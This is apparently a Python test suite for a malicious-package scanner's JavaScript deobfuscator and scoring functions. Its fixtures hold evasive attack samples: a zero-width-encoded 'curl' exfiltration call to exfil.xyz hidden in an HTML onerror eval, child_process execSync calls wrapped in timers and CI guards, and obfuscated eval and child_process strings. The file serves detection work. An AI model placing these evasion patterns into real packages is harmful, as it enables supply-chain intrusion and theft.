"""
PackGuard Stage 2 v5 — Challenger Adversarial & Empirical Stress Suite

Authors: Challenger 1 (critic, specialist)
Scope: Empirical challenge, multi-tier nested evasions, pathological boundaries,
       false alarm preservation, and stress testing for ast_deobfuscator and text_formatter.
"""

import os
import re
import sys
import time
import unittest
from pathlib import Path

# Setup paths
V5_DIR = Path(__file__).resolve().parent.parent
if str(V5_DIR) not in sys.path:
    sys.path.insert(0, str(V5_DIR))

from ast_deobfuscator import (
    deobfuscate_javascript,
    decode_string_escapes,
    fold_string_concatenations,
    inline_string_lookup_arrays,
    normalize_computed_properties,
    strip_token_dilution_and_comments,
    unfold_polyglot_payloads,
    analyze_and_unfold_wasm_bridges,
    unfold_steganographic_payloads,
    unfold_timebombs_and_environment,
    RE_WASM_MAGIC_BYTES,
    RE_ENV_SANDBOX_CHECK,
    RE_DEFERRED_TIMER,
)
from text_formatter import (
    clean_and_unfold_js,
    extract_structural_features,
    extract_mitre_threat_labels,
    extract_shell_exfiltration_signals,
    format_scanner_chunks_to_text,
    format_scanner_chunks_to_multi_windows,
    calibrate_structural_verdict,
)


class TestChallengerEmpiricalVulnerabilities(unittest.TestCase):
    """
    Empirical Probes: Directly reproduces and verifies the 4 concrete bugs/vulnerabilities
    discovered during adversarial challenge of Milestone 1.
    """

    def test_probe_vuln1_timeout_callback_premature_truncation(self):
        """
        VULNERABILITY 1 (VERIFIED FIXED): RE_DEFERRED_TIMER anchors delay so entire callback body
        is retained even when nested object literals fn({ a: 1 }) appear.
        """
        code = (
            "setTimeout(function() {\n"
            "    doSomethingElse({ a: 1 });\n"
            "    require('child_process').execSync('pwned_payload');\n"
            "}, 5000);\n"
        )
        cleaned, count = unfold_timebombs_and_environment(code)
        
        inlined_part = cleaned.split("INLINED_TIMER_CALLBACK")[1]
        self.assertIn(
            "pwned_payload",
            inlined_part,
            "Verification: malicious payload after an object argument inside setTimeout must be retained in inlined block!",
        )

    def test_probe_vuln2_sandbox_check_else_block_ignored(self):
        """
        VULNERABILITY 2 (VERIFIED FIXED): RE_ENV_SANDBOX_CHECK reliably captures and flattens
        else { ... } blocks instead of matching empty strings.
        """
        code = "if (process.env.CI) return; else { require('child_process').execSync('whoami'); }"
        cleaned, count = unfold_timebombs_and_environment(code)

        # Verification: count >= 1 and the else block is flattened
        self.assertGreaterEqual(count, 1, "Verification: CI guard else block must be extracted and flattened")
        self.assertIn("FLATTENED_ENVIRONMENT_GUARD", cleaned)

    def test_probe_vuln3_wasm_magic_bytes_real_array_missed(self):
        """
        VULNERABILITY 3 (VERIFIED FIXED): RE_WASM_MAGIC_BYTES detects real multi-byte WASM array literals
        e.g. [0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00].
        """
        real_wasm_header = "[0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00]"
        hits = RE_WASM_MAGIC_BYTES.findall(real_wasm_header)

        # Verification: real WASM header array is detected
        self.assertGreaterEqual(len(hits), 1, "Verification: real WASM header array must be matched by RE_WASM_MAGIC_BYTES")

    def test_probe_vuln4_benign_asset_read_buffer_false_alarm(self):
        """
        VULNERABILITY 4 (VERIFIED FIXED): unfold_steganographic_payloads excludes Buffer.from from dynamic execution sinks,
        preventing false positive synthesis of eval() for benign asset readers.
        """
        benign_code = (
            "const fs = require('fs');\n"
            "const path = require('path');\n"
            "function getIcon() {\n"
            "    const data = fs.readFileSync(path.join(__dirname, 'icon.png'));\n"
            "    return Buffer.from(data);\n"
            "}\n"
            "module.exports = getIcon;\n"
        )
        cleaned, stats = deobfuscate_javascript(benign_code)
        
        # Verification:
        # 1. No synthetic eval was injected
        self.assertNotIn("eval(_steg_buf.toString())", cleaned)
        self.assertEqual(stats["steganography_extracted"], 0)

        # 2. Features count eval=0 and probability remains benign (prob <= 0.35)
        feats = extract_structural_features({"chunks": [{"file": "index.js", "text": benign_code}]})
        prob, mitre = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertLessEqual(
            prob, 0.35,
            f"Verification: benign asset reader must remain prob <= 0.35 (got {prob})!"
        )


class TestChallengerMultiTierNested(unittest.TestCase):
    """Suite 1: Multi-tier nested evasion unfolding."""

    def test_nested_event_handler_zero_width_curl_exfil(self):
        """
        Adversarial combination:
        HTML onerror event attribute contains zero-width binary steganography
        encoding a shell curl exfiltration command.
        """
        secret = "curl http://exfil.xyz?k="
        zw_encoded = "".join(
            "".join("\u200C" if (b >> i) & 1 else "\u200B" for i in range(7, -1, -1))
            for b in secret.encode("utf-8")
        )

        html_vector = f'<img src="missing.png" onerror="eval(\'{zw_encoded}\');" />'

        cleaned, stats = deobfuscate_javascript(html_vector)
        self.assertGreaterEqual(stats["polyglot_unfolded"], 1)
        self.assertGreaterEqual(stats["steganography_extracted"], 1)
        self.assertIn("curl http://exfil.xyz?k=", cleaned)

        feats = extract_structural_features({"chunks": [{"file": "index.html", "text": html_vector}]})
        self.assertEqual(feats["has_net"], 1, "Must detect curl exfil from steganography inside polyglot")
        self.assertEqual(feats["mitre_exfil"], 1)

    def test_nested_svg_script_with_timebomb_and_obfuscator_io(self):
        """
        Nested combination: Polyglot SVG -> CDATA <script> -> setTimeout -> Obfuscator.io shifted array.
        """
        nested_code = (
            '<svg xmlns="http://www.w3.org/2000/svg">\n'
            '  <script type="text/javascript"><![CDATA[\n'
            '    setTimeout(function() {\n'
            '      var _0x1a2b = ["execSync", "whoami", "child_process"];\n'
            '      (function(_0xarr, _0xcnt) {\n'
            '        var _0xrot = function(_0xn) {\n'
            '          while (--_0xn) {\n'
            '            _0xarr["push"](_0xarr["shift"]());\n'
            '          }\n'
            '        };\n'
            '        _0xrot(++_0xcnt);\n'
            '      }(_0x1a2b, 0x1));\n'
            '      require(_0x1a2b[1])[_0x1a2b[2]](_0x1a2b[0]);\n'
            '    }, 5000);\n'
            '  ]]></script>\n'
            '</svg>\n'
        )

        cleaned, stats = deobfuscate_javascript(nested_code)
        self.assertGreaterEqual(stats["polyglot_unfolded"], 1)
        self.assertGreaterEqual(stats["timebomb_inlined"], 1)
        self.assertIn("child_process", cleaned)


class TestChallengerPathologicalBoundaries(unittest.TestCase):
    """Suite 2: Extreme boundary cases, corrupt tokens, and pathological inputs."""

    def test_massive_comment_dilution(self):
        """15,000 lines of adversarial comment dilution must be stripped quickly without hanging."""
        lines = [f"// comment line padding {i} with garbage tokens xyz" for i in range(15000)]
        lines.append('const cp = require("child_process"); cp.execSync("whoami");')
        massive_code = "\n".join(lines)

        t0 = time.perf_counter()
        cleaned, stats = deobfuscate_javascript(massive_code)
        elapsed = time.perf_counter() - t0

        self.assertIn("child_process", cleaned)
        self.assertIn("execSync", cleaned)
        self.assertGreater(stats["stripped_comment_chars"], 100000)
        self.assertLess(elapsed, 2.0, f"Comment stripping took too long: {elapsed:.2f}s (ReDoS check)")

    def test_massive_unclosed_multiline_comment(self):
        """Unclosed multiline comment (/* without */) across 50,000 characters."""
        pathological = "/* " + "A" * 50000 + "\nconst x = 1;"
        t0 = time.perf_counter()
        cleaned, stats = deobfuscate_javascript(pathological)
        elapsed = time.perf_counter() - t0
        self.assertLess(elapsed, 1.0, f"Unclosed comment caused excessive backtrack: {elapsed:.2f}s")

    def test_pathological_string_concatenation_depth(self):
        """500 adjacent concatenated strings ('a' + 'b' + ...) must not crash recursion or loop."""
        segments = [f'"seg_{i}"' for i in range(500)]
        concat_chain = "const full = " + " + ".join(segments) + ";"

        t0 = time.perf_counter()
        cleaned, stats = deobfuscate_javascript(concat_chain)
        elapsed = time.perf_counter() - t0

        self.assertLess(elapsed, 1.0)
        self.assertIn("seg_0", cleaned)
        self.assertIn("seg_499", cleaned)

    def test_corrupt_hex_unicode_octal_escapes(self):
        """Malformed and boundary escape sequences must not cause uncaught exceptions."""
        malformed = (
            r'const a = "\xGG";'  # Invalid hex
            r'const b = "\x";'    # Truncated hex
            r'const c = "\u";'    # Truncated unicode
            r'const d = "\u12";'  # Incomplete unicode
            r'const e = "\uZZZZ";'# Non-hex unicode
            r'const f = "\uD800";'# High surrogate
            r'const g = "\uDFFF";'# Low surrogate
            r'const h = "\0";'    # Null escape
            r'const i = "\777";'  # High octal
            r'const j = "\8";'    # Non-octal digit
            r'const k = "\999";'  # Non-octal digits
            r'const l = "\x00";'  # Null byte
        )
        cleaned, stats = deobfuscate_javascript(malformed)
        self.assertIsInstance(cleaned, str)
        # Ensure surrogates were not decoded to lone surrogate code points that crash tokenizers
        cleaned.encode("utf-8")

    def test_degenerate_obfuscator_io_arrays(self):
        """Degenerate string array tables (empty, single-element, giant shift) must not crash."""
        cases = [
            "var _0xempty = [];",
            "var _0xsingle = ['only_one'];",
            """
            var _0xbig = ["a", "b"];
            (function(a, c) { while (--c) a.push(a.shift()); }(_0xbig, 0xFFFFFFFF));
            const x = _0xbig[0];
            """,
            """
            var _0xneg = ["a", "b"];
            (function(a, c) { while (--c) a.push(a.shift()); }(_0xneg, -5));
            """,
        ]
        for c in cases:
            cleaned, stats = deobfuscate_javascript(c)
            self.assertIsInstance(cleaned, str)

    def test_empty_and_whitespace_inputs(self):
        """Empty, whitespace-only, and non-ASCII inputs."""
        for empty_val in ("", "   ", "\n\n\t\r\n", "\x00\x00\x00"):
            cleaned, stats = deobfuscate_javascript(empty_val)
            self.assertIsInstance(cleaned, str)
            feats = extract_structural_features({"chunks": [{"file": "index.js", "text": empty_val}]})
            self.assertEqual(feats["has_cp"], 0)
            self.assertEqual(feats["has_net"], 0)


class TestChallengerFalseAlarmPreservation(unittest.TestCase):
    """Suite 3: Benign package false alarm preservation."""

    def test_core_stage1_false_alarms(self):
        """Verify all 6 core Stage 1 false alarm archetypes remain prob <= 0.35."""
        from conftest_base import BENIGN_FALSE_ALARM_PACKAGES
        for p in BENIGN_FALSE_ALARM_PACKAGES:
            name = p["package"]
            feats = extract_structural_features(p)
            prob, mitre = calibrate_structural_verdict(feats, raw_prob=0.50)
            self.assertLessEqual(
                prob, 0.35,
                f"False Alarm package {name} received unacceptable high probability {prob}"
            )
            self.assertEqual(mitre.get("mitre_exec", 0), 0)
            self.assertEqual(mitre.get("mitre_exfil", 0), 0)

    def test_benign_hasown_pure_utility(self):
        """hasown: pure Object.prototype utility."""
        hasown_pkg = {
            "package": "hasown@2.0.0",
            "chunks": [
                {
                    "file": "index.js",
                    "kind": "js",
                    "text": """
                    'use strict';
                    var call = Function.prototype.call;
                    var $hasOwn = Object.prototype.hasOwnProperty;
                    module.exports = function hasOwn(val, key) {
                        return call.bind($hasOwn)(val, key);
                    };
                    """,
                }
            ],
        }
        feats = extract_structural_features(hasown_pkg)
        prob, mitre = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertLessEqual(prob, 0.35, f"hasown must remain benign, got {prob}")

    def test_benign_json_file_reader(self):
        """Benign JSON file reader with fs.readFileSync on config/json files."""
        json_pkg = {
            "package": "read-json-config@1.0.0",
            "chunks": [
                {
                    "file": "index.js",
                    "kind": "js",
                    "text": """
                    const fs = require('fs');
                    const path = require('path');
                    function readConfig(name) {
                        const file = path.join(__dirname, name + '.json');
                        return JSON.parse(fs.readFileSync(file, 'utf8'));
                    }
                    module.exports = readConfig;
                    """,
                }
            ],
        }
        feats = extract_structural_features(json_pkg)
        prob, mitre = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertLessEqual(prob, 0.35, f"JSON file reader must remain benign, got {prob}")

    def test_benign_crypto_hasher(self):
        """Benign cryptographic hashing utility."""
        crypto_pkg = {
            "package": "safe-sha256@1.0.0",
            "chunks": [
                {
                    "file": "index.js",
                    "kind": "js",
                    "text": """
                    const crypto = require('crypto');
                    function sha256(data) {
                        return crypto.createHash('sha256').update(data).digest('hex');
                    }
                    module.exports = sha256;
                    """,
                }
            ],
        }
        feats = extract_structural_features(crypto_pkg)
        prob, mitre = calibrate_structural_verdict(feats, raw_prob=0.50)
        self.assertLessEqual(prob, 0.35, f"Crypto utility must remain benign, got {prob}")


class TestChallengerPerformanceHarness(unittest.TestCase):
    """Suite 4: Latency and throughput benchmarks on CPU."""

    def test_deobfuscator_throughput_100_runs(self):
        """100 iterations of AST de-obfuscation must complete under 500 ms (<5 ms/run)."""
        sample_code = """
        const _0x1a = ["execSync", "whoami", "child_process"];
        (function(arr, n) { while (--n) arr.push(arr.shift()); }(_0x1a, 2));
        const mod = "\\x63\\x68\\x69\\x6c\\x64\\x5f" + "\\x70\\x72\\x6f\\x63\\x65\\x73\\x73";
        const cp = require(mod);
        global["\\x65\\x76\\x61\\x6c"](cp.execSync("id"));
        """
        t0 = time.perf_counter()
        for _ in range(100):
            cleaned, stats = deobfuscate_javascript(sample_code)
        elapsed = time.perf_counter() - t0
        avg_ms = (elapsed / 100) * 1000.0

        self.assertLess(avg_ms, 5.0, f"Deobfuscator too slow on CPU: {avg_ms:.2f} ms/op (target < 5ms)")

    def test_text_formatter_throughput_100_runs(self):
        """100 iterations of text formatting must complete under 500 ms (<5 ms/run)."""
        sample_record = {
            "package": "benchmark-pkg",
            "chunks": [
                {
                    "file": "index.js",
                    "kind": "js",
                    "text": 'const cp = require("child_process"); cp.exec("curl https://oob.site");'
                }
            ]
        }
        t0 = time.perf_counter()
        for _ in range(100):
            formatted = format_scanner_chunks_to_text(sample_record)
            feats = extract_structural_features(sample_record)
            prob, mitre = calibrate_structural_verdict(feats)
        elapsed = time.perf_counter() - t0
        avg_ms = (elapsed / 100) * 1000.0

        self.assertLess(avg_ms, 5.0, f"Formatter too slow on CPU: {avg_ms:.2f} ms/op (target < 5ms)")


def tearDownModule():
    """Clean up sys.modules to prevent cross-module test pollution during unittest discovery."""
    sys.modules.pop("text_formatter", None)
    sys.modules.pop("ast_deobfuscator", None)


if __name__ == "__main__":
    unittest.main()
